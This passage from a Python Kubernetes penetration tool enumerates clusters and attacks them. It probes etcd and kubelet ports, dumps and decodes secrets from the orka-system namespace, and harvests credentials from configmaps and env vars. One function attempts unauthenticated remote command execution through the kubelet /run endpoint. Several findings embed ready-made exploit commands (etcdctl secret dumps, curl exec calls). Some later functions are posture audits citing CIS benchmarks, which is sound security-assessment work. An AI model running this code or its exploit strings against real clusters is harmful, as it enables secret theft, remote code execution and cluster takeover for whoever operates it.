                'description': 'Service account has cluster-admin equivalent (*/*)',
                'exploit': 'Full cluster control. Create privileged pods, '
                           'extract all secrets, modify RBAC.',
            })

    # ------------------------------------------------------------------
    # etcd direct access — port 2379 no-TLS
    # Source: Production K8s ch7 (etcd stores secrets unencrypted by default)
    # Key path: /registry/secrets/{namespace}/{name}
    # ------------------------------------------------------------------

    def probe_etcd(self):
        """
        Probe etcd on port 2379 (no-TLS). If reachable, attempt to dump secrets.
        etcd stores K8s secrets at /registry/secrets/<ns>/<name> in plaintext
        unless EncryptionConfiguration is set on the API server.
        """
        targets = [
            '127.0.0.1', 'localhost', 'etcd', 'etcd.kube-system.svc',
            'etcd.kube-system.svc.cluster.local',
        ]
        for host in targets:
            if self._tcp_reachable(host, 2379, timeout=2):
                finding = {
                    'host': host,
                    'port': 2379,
                    'tls': False,
                    'description': 'etcd port 2379 reachable without TLS',
                    'severity': 'CRITICAL',
                    'exploit': (
                        f'ETCDCTL_API=3 etcdctl --endpoints=http://{host}:2379 '
                        'get /registry/secrets/ --prefix --keys-only '
                        '# then per-key: etcdctl get /registry/secrets/<ns>/<name>'
                    ),
                    'secret_prefix': '/registry/secrets/',
                }
                # Try a quick HTTP GET to confirm it's actually etcd
                try:
                    url = f'http://{host}:2379/version'
                    with urllib.request.urlopen(url, timeout=2) as r:
                        body = r.read().decode()
                        if 'etcdcluster' in body.lower() or 'etcdserver' in body.lower():
                            finding['confirmed'] = True
                            finding['version_response'] = body[:300]
                except Exception:
                    finding['confirmed'] = False
                self.etcd_findings.append(finding)
                break  # first reachable host is enough

    # ------------------------------------------------------------------
    # Kubelet API — port 10250
    # Source: K8s Best Practices 2e ch19, Cloud Native DevOps ch11
    # /pods — list all pods on node
    # /run/{ns}/{pod}/{container} — command execution
    # ------------------------------------------------------------------

    def probe_kubelet(self):
        """
        Probe kubelet API on port 10250. Unauth kubelet = arbitrary command exec
        on the node. Also check 10255 (read-only, no-auth, deprecated).
        Source: K8s Best Practices ch19 — 'Kubelet ships with unauthenticated API enabled'
        """
        kubelet_hosts = ['127.0.0.1', 'localhost']
        # In a pod, the node IP is available via status.hostIP (Downward API)
        node_ip = os.getenv('NODE_IP') or os.getenv('HOST_IP')
        if node_ip:
            kubelet_hosts.insert(0, node_ip)

        for host in kubelet_hosts:
            # Port 10250 — main API (may require auth)
            if self._tcp_reachable(host, 10250, timeout=2):
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                # /pods endpoint
                pods_url = f'https://{host}:10250/pods'
                try:
                    req = urllib.request.Request(pods_url)
                    with urllib.request.urlopen(req, context=ctx, timeout=4) as r:
                        body = r.read().decode()
                        self.kubelet_findings.append({
                            'host': host,
                            'port': 10250,
                            'endpoint': '/pods',
                            'auth_required': False,
                            'severity': 'CRITICAL',
                            'response_size': len(body),
                            'description': 'Kubelet /pods endpoint accessible without auth',
                            'exploit': (
                                f'curl -sk https://{host}:10250/pods | '
                                'jq .items[].metadata.name\n'
                                f'# exec: curl -sk -X POST '
                                f'https://{host}:10250/run/<ns>/<pod>/<container> '
                                '-d "cmd=id"'
                            ),
                        })
                except urllib.error.HTTPError as e:
                    if e.code == 401 or e.code == 403:
                        self.kubelet_findings.append({
                            'host': host,
                            'port': 10250,
                            'endpoint': '/pods',
                            'auth_required': True,
                            'severity': 'INFO',
                            'description': f'Kubelet /pods requires auth (HTTP {e.code})',
                        })
                except Exception:
                    pass

            # Port 10255 — read-only, no auth (deprecated in newer K8s but common)
            if self._tcp_reachable(host, 10255, timeout=2):
                try:
                    url = f'http://{host}:10255/pods'
                    with urllib.request.urlopen(url, timeout=3) as r:
                        body = r.read().decode()
                        self.kubelet_findings.append({
                            'host': host,
                            'port': 10255,
                            'endpoint': '/pods',
                            'auth_required': False,
                            'severity': 'HIGH',
                            'response_size': len(body),
                            'description': 'Kubelet read-only port 10255 accessible (no auth)',
                            'exploit': (
                                f'curl -s http://{host}:10255/pods | '
                                'jq .items[].spec.containers[].env '
                                '# env vars including injected secrets'
                            ),
                        })
                except Exception:
                    pass
            break  # first reachable host

    # ------------------------------------------------------------------
    # Kubernetes Dashboard probe
    # Source: Cloud Native DevOps ch11 — 'never give cluster-admin to the Dashboard'
    # ------------------------------------------------------------------

    def probe_dashboard(self):
        """
        Probe for Kubernetes dashboard on common ports/endpoints.
        Unauth dashboard = direct cluster-admin equivalent in many older deploys.
        """
        candidates = []

        # Inside cluster: standard service DNS
        dash_host = 'kubernetes-dashboard.kubernetes-dashboard.svc'
        dash_host_alt = 'kubernetes-dashboard.kube-system.svc'

        for proto, host, port in [
            ('https', dash_host, 443),
            ('https', dash_host_alt, 443),
            ('http',  dash_host, 80),
            ('https', '127.0.0.1', 8443),
            ('http',  '127.0.0.1', 9090),
        ]:
            if not self._tcp_reachable(host, port, timeout=2):
                continue
            try:
                url = f'{proto}://{host}:{port}/'
                ctx = None
                if proto == 'https':
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                req = urllib.request.Request(url)
                req.add_header('Accept', 'text/html')
                with urllib.request.urlopen(req, context=ctx, timeout=4) as r:
                    body = r.read(4096).decode('utf-8', errors='ignore')
                    is_dashboard = (
                        'kubernetes-dashboard' in body.lower()
                        or 'kube-dashboard' in body.lower()
                        or '<title>Kubernetes' in body
                    )
                    if is_dashboard:
                        # Test for skip-login (unauthenticated access)
                        skip_url = f'{proto}://{host}:{port}/api/v1/login/skippable'
                        skippable = False
                        try:
                            with urllib.request.urlopen(
                                urllib.request.Request(skip_url), context=ctx, timeout=3
                            ) as sr:
                                skip_body = sr.read().decode()
                                skippable = 'true' in skip_body.lower()
                        except Exception:
                            pass

                        self.dashboard_findings.append({
                            'url': url,
                            'reachable': True,
                            'skip_login': skippable,
                            'severity': 'CRITICAL' if skippable else 'HIGH',
                            'description': (
                                'Kubernetes dashboard reachable'
                                + (' — skip-login enabled (UNAUTH ACCESS)' if skippable else '')
                            ),
                            'exploit': (
                                'Navigate to dashboard → skip login → '
                                'full cluster-admin via UI. '
                                'Or: use token from /var/run/secrets/.../token.'
                            ) if skippable else (
                                f'Probe {url} — needs bearer token. '
                                'Use SA token from pod mount if SA has dashboard access.'
                            ),
                        })
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Orka-specific enumeration
    # MacStadium Orka runs on K8s; orka-system namespace holds API server secrets
    # ------------------------------------------------------------------

    def enum_orka(self):
        """
        Enumerate orka-system namespace for Orka API server credentials.
        The orka-api-server pod's SA token or mounted secrets may grant
        access to the Orka management plane (VM lifecycle, SSH keys, etc.).
        """
        ns = 'orka-system'
        namespaces = getattr(self, '_visible_namespaces', [])

        if ns not in namespaces:
            # Try a direct API call anyway
            data = self._api_get(f'/api/v1/namespaces/{ns}/pods')
            if not data:
                return

        # Find orka-api-server pod
        pods_data = self._api_get(f'/api/v1/namespaces/{ns}/pods')
        if pods_data and 'items' in pods_data:
            for item in pods_data['items']:
                name = item['metadata']['name']
                if 'orka-api' in name or 'orka-controller' in name:
                    spec = item.get('spec', {})
                    env_creds = []
                    for container in spec.get('containers', []):
                        for env in container.get('env', []):
                            if _looks_like_cred(env.get('name', '')):
                                env_creds.append({
                                    'container': container.get('name'),
                                    'key': env.get('name'),
                                    'value': env.get('value', '<from secret/cm>'),
                                })
                    self.orka_findings.append({
                        'type': 'ORKA_API_SERVER_POD',
                        'pod_name': name,
                        'namespace': ns,
                        'sa': spec.get('serviceAccountName', 'default'),
                        'env_creds': env_creds,
                        'host_network': spec.get('hostNetwork', False),
                    })

        # Dump orka-system secrets
        secrets_data = self._api_get(f'/api/v1/namespaces/{ns}/secrets')
        if secrets_data and 'items' in secrets_data:
            for item in secrets_data['items']:
                meta = item.get('metadata', {})
                raw_data = item.get('data', {})
                decoded = {}
                for k, v in raw_data.items():
                    try:
                        decoded[k] = base64.b64decode(v).decode('utf-8', errors='replace')
                    except Exception:
                        decoded[k] = v
                self.orka_findings.append({
                    'type': 'ORKA_SECRET',
                    'name': meta.get('name', ''),
                    'namespace': ns,
                    'secret_type': item.get('type', ''),
                    'data': decoded,
                })

        # Dump orka-system configmaps
        cm_data = self._api_get(f'/api/v1/namespaces/{ns}/configmaps')
        if cm_data and 'items' in cm_data:
            for item in cm_data['items']:
                meta = item.get('metadata', {})
                cdata = item.get('data', {})
                hits = {k: v for k, v in cdata.items() if _looks_like_cred(k)}
                if hits or 'orka' in meta.get('name', '').lower():
                    self.orka_findings.append({
                        'type': 'ORKA_CONFIGMAP',
                        'name': meta.get('name', ''),
                        'namespace': ns,
                        'credential_keys': list(hits.keys()),
                        'data': hits,
                    })

    # ------------------------------------------------------------------
    # Utility
    # ------------------------------------------------------------------

    def _tcp_reachable(self, host: str, port: int, timeout: float = 2.0) -> bool:
        """Return True if TCP connection to host:port succeeds within timeout."""
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Report
    # ------------------------------------------------------------------

    def report(self):
        lines = ['=' * 70, 'KUBERNETES ENUMERATION', '=' * 70]

        lines.append(f'\nIn K8s pod: {self.in_k8s}')
        if self.in_k8s:
            lines.append(f'Namespace: {self.namespace or "N/A"}')
            lines.append(f'Service account: {self.service_account or "N/A"}')
            lines.append(f'API server: {self.api_server or "N/A"}')
            lines.append(f'Has SA token: {bool(self.token)}')
            lines.append(f'Has CA cert: {bool(self.ca_cert)}')

            if self.pods:
                lines.append(f'\nPods ({len(self.pods)}):')
                for p in self.pods[:10]:
                    flags = []
                    if p.get('privileged'): flags.append('PRIV')
                    if p.get('host_pid'):   flags.append('HOSTPID')
                    if p.get('host_network'): flags.append('HOSTNET')
                    if p.get('host_paths'): flags.append(f'HOSTPATH:{p["host_paths"]}')
                    lines.append(f'  {p["name"]} ({p["status"]}) sa={p.get("service_account","")} '
                                 f'{" ".join(flags)}')

            if self.secret_data:
                lines.append(f'\nSecrets extracted (decoded): {len(self.secret_data)}')
                for s in self.secret_data[:5]:
                    lines.append(f'  {s["namespace"]}/{s["name"]} type={s["type"]} '
                                 f'keys={list(s["data"].keys())}')

            if self.configmap_creds:
                lines.append(f'\nConfigMap credential hits: {len(self.configmap_creds)}')
                for c in self.configmap_creds:
                    lines.append(f'  {c["namespace"]}/{c["name"]} keys={c["credential_keys"]}')

            if self.self_access:
                allowed = [f'{a["verb"]} {a["resource"]}'
                           for a in self.self_access if a.get('allowed')]
                lines.append(f'\nSelfSubjectAccessReview — allowed ({len(allowed)}):')
                for a in allowed:
                    lines.append(f'  + {a}')

            if self.rbac:
                lines.append(f'\nRBAC (kubectl): {len(self.rbac)} allowed')
                for r in self.rbac:
                    lines.append(f'  + {r["permission"]}')

            if self.escape_vectors:
                lines.append(f'\nEscape vectors: {len(self.escape_vectors)}')
                for v in self.escape_vectors:
                    lines.append(f'  [{v["severity"]}] {v["type"]}')
                    lines.append(f'    {v["description"]}')

        if self.etcd_findings:
            lines.append(f'\netcd findings: {len(self.etcd_findings)}')
            for e in self.etcd_findings:
                lines.append(f'  [CRITICAL] {e["host"]}:2379 — {e["description"]}')

        if self.kubelet_findings:
            lines.append(f'\nKubelet findings: {len(self.kubelet_findings)}')
            for k in self.kubelet_findings:
                lines.append(f'  [{k["severity"]}] {k["host"]}:{k["port"]}'
                             f'{k["endpoint"]} — {k["description"]}')

        if self.dashboard_findings:
            lines.append(f'\nDashboard findings: {len(self.dashboard_findings)}')
            for d in self.dashboard_findings:
                lines.append(f'  [{d["severity"]}] {d["url"]} — {d["description"]}')

        if self.orka_findings:
            lines.append(f'\nOrka findings: {len(self.orka_findings)}')
            for o in self.orka_findings:
                lines.append(f'  [{o["type"]}] {o.get("namespace","")}/{o.get("name","") or o.get("pod_name","")}')

        if self.network_policy_findings:
            no_policy = [e for e in self.network_policy_findings if not e['has_policy']]
            lines.append(
                f'\nNetworkPolicy — {len(no_policy)} namespaces with NO policy '
                f'(of {len(self.network_policy_findings)} visible):'
            )
            for e in no_policy:
                lines.append(f'  [HIGH] {e["namespace"]} — no NetworkPolicy, lateral movement unrestricted')

        if self.clusteradmin_findings:
            lines.append(f'\nClusterAdmin bindings: {len(self.clusteradmin_findings)}')
            for e in self.clusteradmin_findings:
                lines.append(
                    f'  [{e["severity"]}] {e["name"]} -> '
                    f'{e["subject_kind"]} {e["subject_namespace"]}/{e["subject_name"]}'
                )

        if self.privileged_pod_findings:
            crits = [e for e in self.privileged_pod_findings if e['severity'] == 'CRITICAL']
            highs = [e for e in self.privileged_pod_findings if e['severity'] == 'HIGH']
            lines.append(
                f'\nPrivileged pod findings: {len(self.privileged_pod_findings)} '
                f'({len(crits)} CRITICAL, {len(highs)} HIGH)'
            )
            for e in crits + highs:
                lines.append(
                    f'  [{e["severity"]}] {e["namespace"]}/{e["pod"]} '
                    f'[{e["container"]}] — {e["issue"]}'
                )

        if self.secret_env_findings:
            literals = [e for e in self.secret_env_findings
                        if e['source_type'] == 'literal_cleartext']
            refs = [e for e in self.secret_env_findings
                    if e['source_type'] == 'secretKeyRef']
            lines.append(
                f'\nSecret env vars: {len(self.secret_env_findings)} '
                f'({len(literals)} literal cleartext, {len(refs)} secretKeyRef)'
            )
            for e in literals:
                lines.append(
                    f'  [HIGH] {e["namespace"]}/{e["pod"]} [{e["container"]}] '
                    f'{e["env_var"]} = <literal>'
                )
            for e in refs[:10]:
                lines.append(
                    f'  [MED]  {e["namespace"]}/{e["pod"]} [{e["container"]}] '
                    f'{e["env_var"]} <- secret:{e["secret_ref"]}'
                )

        return '\n'.join(lines)


# --------------------------------------------------------------------------
# Standalone probe functions (module-level, no K8sEnumerator dependency)
# Synthesized from: Kubernetes in Action 2e ch8 (ConfigMaps/Secrets, resource
# fields via Downward API), ch6 (pod lifecycle / QoS eviction order),
# Production Kubernetes ch10 (LimitRange, multi-tenancy resource governance)
# --------------------------------------------------------------------------

_DB_URL_PREFIXES = (
    'postgres://', 'postgresql://', 'mysql://', 'mongodb://',
    'redis://', 'amqp://', 'jdbc:', 'mongodb+srv://',
)

_CRED_VALUE_KEYS = {
    'api_key', 'apikey', 'password', 'passwd', 'token', 'secret',
    'authorization', 'auth_token', 'access_key', 'private_key',
    'client_secret', 'jwt_secret', 'bearer',
}


def _k8s_get(host: str, port: int, path: str, timeout: float) -> dict | None:
    """Unauthenticated GET to K8s API (HTTP first, HTTPS fallback). Returns JSON or None."""
    for scheme in ('http', 'https'):
        url = f'{scheme}://{host}:{port}{path}'
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url)
            req.add_header('Accept', 'application/json')
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
                return json.loads(resp.read().decode())
        except Exception:
            continue
    return None


def check_k8s_configmap_exposure(
    host: str, port: int = 8001, timeout: float = 5.0
) -> list:
    """
    Probe K8s API server for unauthenticated ConfigMap exposure.

    Synthesized from K8s In Action 2e ch8: ConfigMaps are not encrypted at rest
    or in transit. Credentials stored in ConfigMaps are accessible to any subject
    with configmap read permission — a far broader grant than secret read, since
    RBAC policies routinely include configmap get/list for workload configuration.

    Checks:
      1. GET /api/v1/configmaps (cluster-wide) without auth
      2. GET /api/v1/namespaces/kube-system/configmaps without auth
      3. Scan returned configmap data for credential/DB-URL fields
      4. GET aws-auth ConfigMap (EKS IAM role mappings)

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    # --- 1. Cluster-wide configmap list (unauthenticated) ---
    data = _k8s_get(host, port, '/api/v1/configmaps', timeout)
    cluster_items = []
    if data and data.get('kind') == 'ConfigMapList':
        cluster_items = data.get('items', [])
        findings.append({
            'severity': 'CRITICAL',
            'title': 'CONFIGMAP_LIST_UNAUTH',
            'detail': (
                f'Unauthenticated GET /api/v1/configmaps returned {len(cluster_items)} '
                'ConfigMap(s) across all namespaces — full cluster configuration exposed'
            ),
            'host': host,
            'port': port,
        })

        # --- 3. Scan cluster-wide configmap data for credentials ---
        cred_hits = []
        for cm in cluster_items:
            ns = cm.get('metadata', {}).get('namespace', '')
            name = cm.get('metadata', {}).get('name', '')
            for key, val in (cm.get('data') or {}).items():
                k_norm = key.lower().replace('-', '_').replace('.', '_')
                v_lower = (val or '').lower()
                if any(pat in k_norm for pat in _CRED_VALUE_KEYS) or \
                        any(v_lower.startswith(pfx) for pfx in _DB_URL_PREFIXES):
                    cred_hits.append(f'{ns}/{name}:{key}')
        if cred_hits:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'CREDENTIALS_IN_CONFIGMAP',
                'detail': (
                    f'Credential or DB URL fields in {len(cred_hits)} ConfigMap key(s): '
                    + ', '.join(cred_hits[:8])
                    + (' …' if len(cred_hits) > 8 else '')
                ),
                'host': host,
                'port': port,
            })

    # --- 2. kube-system configmaps (unauthenticated) ---
    ks_data = _k8s_get(
        host, port, '/api/v1/namespaces/kube-system/configmaps', timeout
    )
    if ks_data and ks_data.get('kind') == 'ConfigMapList':
        ks_items = ks_data.get('items', [])
        findings.append({
            'severity': 'CRITICAL',
            'title': 'KUBE_SYSTEM_CONFIGMAP_UNAUTH',
            'detail': (
                f'Unauthenticated read of kube-system ConfigMaps returned {len(ks_items)} '
                'object(s) — cluster bootstrap config, scheduler policy, and kubeadm '
                'join tokens may be exposed'
            ),
            'host': host,
            'port': port,
        })
        # Only scan kube-system creds if cluster-wide list was denied (avoid duplicate hit)
        if not cluster_items:
            cred_hits = []
            for cm in ks_items:
                name = cm.get('metadata', {}).get('name', '')
                for key, val in (cm.get('data') or {}).items():
                    k_norm = key.lower().replace('-', '_').replace('.', '_')
                    v_lower = (val or '').lower()
                    if any(pat in k_norm for pat in _CRED_VALUE_KEYS) or \
                            any(v_lower.startswith(pfx) for pfx in _DB_URL_PREFIXES):
                        cred_hits.append(f'kube-system/{name}:{key}')
            if cred_hits:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'CREDENTIALS_IN_CONFIGMAP',
                    'detail': (
                        f'Credential or DB URL fields in kube-system ConfigMap(s): '
                        + ', '.join(cred_hits[:8])
                        + (' …' if len(cred_hits) > 8 else '')
                    ),
                    'host': host,
                    'port': port,
                })

    # --- 4. aws-auth ConfigMap (EKS IAM role-to-group mappings) ---
    aws_data = (
        _k8s_get(host, port, '/api/v1/namespaces/kube-system/configmaps/aws-auth', timeout)
        or _k8s_get(host, port, '/api/v1/namespaces/default/configmaps/aws-auth', timeout)
    )
    if aws_data and aws_data.get('kind') == 'ConfigMap':
        findings.append({
            'severity': 'CRITICAL',
            'title': 'AWS_AUTH_CONFIGMAP_EXPOSED',
            'detail': (
                'Unauthenticated read of aws-auth ConfigMap succeeded — '
                'EKS IAM role-to-Kubernetes group mappings are exposed; attacker can '
                'enumerate privileged IAM roles and plan lateral escalation into the '
                'AWS control plane'
            ),
            'host': host,
            'port': port,
        })

    return findings


def check_k8s_resource_limits(
    host: str, port: int = 8001, timeout: float = 5.0
) -> list:
    """
    Probe K8s API for missing resource limits/requests and weak QoS posture.

    Synthesized from K8s In Action 2e ch8 (resource fields via Downward API),
    ch6 (pod lifecycle — QoS class governs eviction order under memory pressure),
    Production Kubernetes ch10 (LimitRange enforcement, multi-tenancy governance).

    QoS classes (K8s In Action 2e ch6):
      Guaranteed  - every container has limits.cpu AND limits.memory, AND
                    requests equal limits (or requests absent, which K8s treats
                    as equal to limits)
      Burstable   - at least one limit or request set, but not Guaranteed
      BestEffort  - no limits or requests on any container; evicted first

    Checks:
      1. Pods with containers missing cpu/memory limits -> HIGH NO_RESOURCE_LIMITS
      2. Namespaces without a LimitRange -> MEDIUM NO_LIMITRANGE
      3. Pods without cpu/memory requests -> MEDIUM NO_RESOURCE_REQUESTS
      4. <50% of pods at Guaranteed QoS -> MEDIUM LOW_GUARANTEED_QOS_RATIO

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    # --- Fetch pods without auth ---
    pods_data = _k8s_get(host, port, '/api/v1/pods', timeout)
    pods = (
        pods_data.get('items', [])
        if pods_data and pods_data.get('kind') == 'PodList'
        else []
    )

    namespaces_seen: set[str] = set()
    no_limits_pods: list[str] = []
    no_requests_pods: list[str] = []
    guaranteed_count = 0

    for pod in pods:
        meta = pod.get('metadata', {})
        ns = meta.get('namespace', 'default')
        pod_name = meta.get('name', '')
        namespaces_seen.add(ns)

        containers = (
            pod.get('spec', {}).get('containers', [])
            + pod.get('spec', {}).get('initContainers', [])
        )
        if not containers:
            continue

        pod_missing_limits = False
        pod_missing_requests = False
        pod_is_guaranteed = True

        for c in containers:
            res = c.get('resources', {})
            limits = res.get('limits') or {}
            requests = res.get('requests') or {}

            cpu_limit = limits.get('cpu')
            mem_limit = limits.get('memory')

            if not cpu_limit or not mem_limit:
                pod_missing_limits = True
                pod_is_guaranteed = False
            else:
                # Guaranteed: requests absent (K8s sets == limits) or explicitly equal
                cpu_req = requests.get('cpu')
                mem_req = requests.get('memory')
                if cpu_req is not None and cpu_req != cpu_limit:
                    pod_is_guaranteed = False
                if mem_req is not None and mem_req != mem_limit:
                    pod_is_guaranteed = False

            if not requests.get('cpu') or not requests.get('memory'):
                pod_missing_requests = True

        if pod_missing_limits:
            no_limits_pods.append(f'{ns}/{pod_name}')
        if pod_missing_requests:
            no_requests_pods.append(f'{ns}/{pod_name}')
        if pod_is_guaranteed:
            guaranteed_count += 1

    if pods:
        # --- 1. Missing resource limits ---
        if no_limits_pods:
            findings.append({
                'severity': 'HIGH',
                'title': 'NO_RESOURCE_LIMITS',
                'detail': (
                    f'{len(no_limits_pods)}/{len(pods)} pod(s) have containers without '
                    'cpu/memory limits — resource exhaustion can cause node OOM or CPU '
                    'starvation, degrading co-located workloads. '
                    'Sample: ' + ', '.join(no_limits_pods[:5])
                    + (' …' if len(no_limits_pods) > 5 else '')
                ),
                'host': host,
                'port': port,
            })

        # --- 3. Missing resource requests ---
        if no_requests_pods:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'NO_RESOURCE_REQUESTS',
                'detail': (
                    f'{len(no_requests_pods)}/{len(pods)} pod(s) lack cpu/memory requests '
                    '— kube-scheduler cannot bin-pack accurately; workloads risk '
                    'over-provisioning or starvation. '
                    'Sample: ' + ', '.join(no_requests_pods[:5])
                    + (' …' if len(no_requests_pods) > 5 else '')
                ),
                'host': host,
                'port': port,
            })

        # --- 4. Low Guaranteed QoS ratio ---
        ratio = guaranteed_count / len(pods)
        if ratio < 0.5:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'LOW_GUARANTEED_QOS_RATIO',
                'detail': (
                    f'{guaranteed_count}/{len(pods)} pods ({ratio:.0%}) have Guaranteed '
                    'QoS (requests == limits for all containers). Non-Guaranteed pods are '
                    'first candidates for eviction under node memory pressure, increasing '
                    'blast radius of resource contention events.'
                ),
                'host': host,
                'port': port,
            })

    # --- 2. LimitRange coverage per namespace (unauthenticated) ---
    no_lr_namespaces: list[str] = []
    for ns in sorted(namespaces_seen):
        lr_data = _k8s_get(host, port, f'/api/v1/namespaces/{ns}/limitranges', timeout)
        if lr_data is not None and not lr_data.get('items'):
            no_lr_namespaces.append(ns)

    if no_lr_namespaces:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'NO_LIMITRANGE',
            'detail': (
                f'{len(no_lr_namespaces)} namespace(s) have no LimitRange — '
                'per-container default limits are not enforced, allowing BestEffort pods '
                'to consume unbounded node resources. '
                'Namespaces: ' + ', '.join(no_lr_namespaces[:10])
                + (' …' if len(no_lr_namespaces) > 10 else '')
            ),
            'host': host,
            'port': port,
        })

    return findings


def check_kubelet_api_exposure(
    host: str, port: int = 10250, timeout: float = 5.0
) -> list:
    """
    Probe kubelet API for unauthenticated access on ports 10250 and 10255.

    Synthesized from K8s Up and Running 3e ch19 (node security, kube-bench
    CIS checks 4.2.1-4.2.4: anonymous-auth, authorization-mode, read-only-port).

    The kubelet exposes two ports:
      10250 - main HTTPS API; requires auth by default but often misconfigured
              with --anonymous-auth=true and --authorization-mode=AlwaysAllow.
              Unauthenticated access allows full pod list and remote exec.
      10255 - read-only HTTP API (deprecated, often still open on older nodes).
              No auth required; exposes pod metadata and metrics.

    CIS Benchmark 4.2.1: anonymous-auth must be false.
    CIS Benchmark 4.2.2: authorization-mode must not be AlwaysAllow.
    CIS Benchmark 4.2.4: read-only-port must be 0 (disabled).

    Checks:
      1. GET https://host:10250/pods               -- CRITICAL KUBELET_PODS_UNAUTH
      2. POST https://host:10250/run/<ns>/<pod>/<ctr> -- CRITICAL KUBELET_EXEC_UNAUTH
      3. GET http://host:10255/pods                -- HIGH KUBELET_READONLY_PORT
      4. GET http://host:10255/metrics             -- MEDIUM KUBELET_METRICS_EXPOSED

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []

    # --- SSL context: skip hostname + cert verification (self-signed on kubelets) ---
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # --- 1. Kubelet HTTPS pods endpoint (port 10250) ---
    pods_url = f'https://{host}:{port}/pods'
    try:
        req = urllib.request.Request(pods_url)
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            if resp.status == 200:
                raw = resp.read().decode('utf-8', errors='replace')
                pods_data: dict = {}
                try:
                    pods_data = json.loads(raw)
                except Exception:
                    pass
                item_count = len(pods_data.get('items', []))
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'KUBELET_PODS_UNAUTH',
                    'detail': (
                        f'Unauthenticated kubelet API on {host}:{port}/pods returned '
                        f'{item_count} pod entries. anonymous-auth=true with '
                        'authorization-mode=AlwaysAllow violates CIS 4.2.1/4.2.2. '
                        'Attacker can enumerate all running pods, extract environment '
                        'variables, and discover service account tokens without credentials.'
                    ),
                    'host': host,
                    'port': port,
                })

                # --- 2. Attempt kubelet exec via /run (sample first eligible pod) ---
                items = pods_data.get('items', [])
                for pod in items:
                    ns = pod.get('metadata', {}).get('namespace', '')
                    pod_name = pod.get('metadata', {}).get('name', '')
                    containers = pod.get('spec', {}).get('containers', [])
                    if not (ns and pod_name and containers):
                        continue
                    ctr_name = containers[0].get('name', '')
                    if not ctr_name:
                        continue
                    exec_url = (
                        f'https://{host}:{port}/run/{ns}/{pod_name}/{ctr_name}'
                    )
                    try:
                        exec_req = urllib.request.Request(
                            exec_url,
                            data=b'command=id',
                            method='POST',
                        )
                        exec_req.add_header(
                            'Content-Type',
                            'application/x-www-form-urlencoded',
                        )
                        with urllib.request.urlopen(
                            exec_req, context=ctx, timeout=timeout
                        ) as exec_resp:
                            if exec_resp.status == 200:
                                output = exec_resp.read().decode(
                                    'utf-8', errors='replace'
                                )[:256]
                                findings.append({
                                    'severity': 'CRITICAL',
                                    'title': 'KUBELET_EXEC_UNAUTH',
                                    'detail': (
                                        f'Remote command execution via unauthenticated '
                                        f'kubelet /run endpoint on {host}:{port}. '
                                        f'Target: {ns}/{pod_name}/{ctr_name}. '
                                        f'Output (truncated): {output!r}. '
                                        'Full container breakout to host is possible '
                                        'via privileged pod or hostPID namespace access.'
                                    ),
                                    'host': host,
                                    'port': port,
                                })
                    except Exception:
                        pass
                    break  # one exec attempt is sufficient to confirm
    except Exception:
        pass

    # --- 3. Kubelet read-only port 10255 /pods ---
    try:
        req = urllib.request.Request(f'http://{host}:10255/pods')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                raw = resp.read().decode('utf-8', errors='replace')
                item_count = 0
                try:
                    item_count = len(json.loads(raw).get('items', []))
                except Exception:
                    pass
                findings.append({
                    'severity': 'HIGH',
                    'title': 'KUBELET_READONLY_PORT',
                    'detail': (
                        f'Kubelet read-only API port 10255 open on {host} '
                        f'and returned {item_count} pod entries without authentication. '
                        'CIS Benchmark 4.2.4 requires --read-only-port=0. '
                        'Exposes pod names, namespaces, image names, environment '
                        'variable keys, and service account mount paths to any network '
                        'observer — useful for pre-attack reconnaissance.'
                    ),
                    'host': host,
                    'port': 10255,
                })
    except Exception:
        pass

    # --- 4. Kubelet read-only metrics endpoint ---
    try:
        req = urllib.request.Request(f'http://{host}:10255/metrics')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'KUBELET_METRICS_EXPOSED',
                    'detail': (
                        f'Node metrics visible via unauthenticated kubelet read-only '
                        f'port at {host}:10255/metrics. '
                        'Exposes CPU/memory/disk usage per container, node capacity, '
                        'running workload counts, and kubelet version — low-cost '
                        'intelligence for workload-aware attack timing and capacity '
                        'planning.'
                    ),
                    'host': host,
                    'port': 10255,
                })
    except Exception:
        pass

    return findings


def check_k8s_admission_controller_gaps(
    host: str, port: int = 8001, timeout: float = 5.0
) -> list:
    """
    Probe K8s API for missing or weak admission webhook configuration.

    Synthesized from K8s Up and Running 3e ch20 (policy and governance,
    Gatekeeper, MutatingWebhookConfiguration, ValidatingWebhookConfiguration,
    failurePolicy=Ignore as fail-open configuration) and ch19 (Pod Security
    admission, PodDisruptionBudgets for availability governance).

    Admission webhooks are the enforcement boundary for cluster-wide policy.
    An empty webhook list means no validating or mutating admission controllers
    are active -- any resource may be admitted regardless of security posture.
    failurePolicy=Ignore creates a fail-open path: if the webhook service is
    unavailable or times out, the request is admitted without policy evaluation.
    This is exploitable via webhook service DoS or via network segmentation that
    isolates the webhook endpoint (as shown in ch20's Gatekeeper example where
    the default Gatekeeper install uses failurePolicy: Ignore with a 3 s timeout).

    Checks:
      1. ValidatingWebhookConfiguration list empty  -- HIGH NO_VALIDATING_WEBHOOKS
